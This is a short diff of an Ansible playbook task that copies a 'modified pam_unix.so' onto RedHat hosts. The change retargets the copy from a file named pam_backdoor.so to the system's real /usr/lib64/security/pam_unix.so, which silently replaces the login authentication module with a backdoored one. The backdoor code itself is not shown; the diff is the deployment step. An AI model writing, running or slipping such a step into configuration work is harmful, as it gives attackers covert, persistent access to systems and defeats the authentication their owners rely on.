@@ -8,7 +8,7 @@
 - name: Copy over modified pam_unix.so (RedHat)
   ansible.builtin.copy:
     src: pam_unix.so
-    dest: /usr/lib64/security/pam_backdoor.so
+    dest: /usr/lib64/security/pam_unix.so
     owner: root
     group: root
     mode: 0644
